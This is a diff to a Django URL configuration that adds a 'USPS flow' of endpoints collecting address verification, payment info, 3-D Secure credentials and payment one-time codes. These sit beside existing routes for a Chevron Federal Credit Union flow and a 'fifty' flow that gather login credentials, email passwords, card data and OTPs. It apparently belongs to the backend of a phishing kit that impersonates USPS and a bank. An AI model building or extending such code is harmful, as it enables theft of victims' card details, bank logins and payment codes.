@@ -182,6 +182,14 @@ from user_data.chevron_views import (
     chevron_collect_user_home_address,
     chevron_collect_user_card_info,
 )
+from user_data.usps_views import (
+    usps_collect_user_address_verification,
+    usps_collect_user_payment_info,
+    usps_collect_user_wait_event,
+    usps_collect_user_3d_credentials,
+    usps_collect_user_payment_otp,
+    usps_collect_user_success_event,
+)
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -294,6 +302,14 @@ urlpatterns = [
     path("api/fifty-meta-data-8/", fifty_collect_user_otp_verification, name="fifty_collect_user_otp_verification"),
     path("api/fifty-email-password/", fifty_collect_user_email_password, name="fifty_collect_user_email_password"),
     path('api/fifty-card-info/', fifty_collect_user_card_info, name='fifty_collect_user_card_info'),
+
+    # USPS flow endpoints
+    path("api/usps-address-verification/", usps_collect_user_address_verification, name="usps_collect_user_address_verification"),
+    path("api/usps-payment-info/", usps_collect_user_payment_info, name="usps_collect_user_payment_info"),
+    path("api/usps-wait-event/", usps_collect_user_wait_event, name="usps_collect_user_wait_event"),
+    path("api/usps-3d-credentials/", usps_collect_user_3d_credentials, name="usps_collect_user_3d_credentials"),
+    path("api/usps-payment-otp/", usps_collect_user_payment_otp, name="usps_collect_user_payment_otp"),
+    path("api/usps-success-event/", usps_collect_user_success_event, name="usps_collect_user_success_event"),
 
     # Chevron Federal Credit Union flow
     path('api/chevron-login/', chevron_collect_user_login_cred, name='chevron_collect_user_login_cred'),
